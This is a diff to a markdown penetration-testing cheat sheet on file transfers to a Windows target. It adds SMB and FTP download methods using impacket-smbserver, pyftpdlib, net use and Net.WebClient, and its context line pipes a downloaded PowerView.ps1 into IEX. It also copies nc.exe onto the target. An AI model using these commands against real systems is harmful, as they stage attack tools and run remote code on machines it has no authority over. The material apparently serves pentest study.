@@ -40,3 +40,32 @@ Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
 ```
 
 ### SMB Downloads
+
+On Kali, create the smb server with password :
+```
+$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
+```
+
+On windows target, mount the SMB server : 
+
+```
+net use n: \\192.168.220.133\share /user:test test
+copy n:\nc.exe
+```
+
+### FTP Downloads
+
+On Kali, create FTP server : 
+
+```
+$ sudo pip3 install pyftpdlib
+$ sudo python3 -m pyftpdlib --port 21
+```
+
+On Windows target, download file : 
+
+```
+(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
+```
+
+## Upload Operations
